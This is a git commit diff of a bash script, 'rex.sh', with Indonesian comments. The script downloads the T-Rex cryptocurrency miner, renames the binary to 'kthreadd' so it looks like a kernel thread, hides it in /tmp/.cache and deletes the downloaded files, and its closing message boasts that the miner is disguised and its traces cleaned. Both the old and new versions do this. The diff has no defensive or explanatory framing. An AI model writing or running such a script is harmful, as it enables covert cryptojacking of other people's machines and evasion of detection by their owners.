dc11ba72c5d2ebd189f6465fdca43242912ca059
ANTI VIRAL <109937537+ANTI-VIRAL@users.noreply.github.com>
2025-04-22 02:21:51 +0800

    Update rex.sh

--- rex.sh
+++ rex.sh
@@ -1,30 +1,28 @@
 #!/bin/bash
 
-# Link download
+# Setup
 URL="https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz"
 ARCHIVE="t-rex-0.26.8-linux.tar.gz"
-FOLDER="t-rex-0.26.8-linux.tar"
+WORKDIR="PANEN"
 MINER_NAME="t-rex"
 NEW_NAME="kthreadd"
 DEST="/tmp/.cache"
 
-# Download file
-wget -q --show-progress "$URL"
+# Buat folder kerja
+mkdir -p "$WORKDIR"
+cd "$WORKDIR" || exit
 
-# Extract file .tar.gz
+# Download dan ekstrak
+wget -q --show-progress "$URL"
 tar -xf "$ARCHIVE"
 
-# Pastikan folder hasil ekstrak ada
-if [[ -d "$FOLDER" ]]; then
-    # Rename dan pindah
-    mv "$FOLDER/$MINER_NAME" "$NEW_NAME"
-    mkdir -p "$DEST"
-    mv "$NEW_NAME" "$DEST/"
-    
-    # Hapus semua jejak
-    rm -rf "$FOLDER" "$ARCHIVE"
-    
-    echo "Done sayang! udah nyamar jadi $DEST/$NEW_NAME"
-else
-    echo "Folder hasil ekstrak nggak ketemu, mungkin ada yang salah ekstrak sayang~"
-fi
+# Rename dan pindah
+mv "$MINER_NAME" "$NEW_NAME"
+mkdir -p "$DEST"
+mv "$NEW_NAME" "$DEST/"
+
+# Bersih-bersih jejak
+cd ..
+rm -rf "$WORKDIR"
+
+echo "Done sayang! Minernya udah nyamar jadi $DEST/$NEW_NAME dan jejaknya udah bersih~"
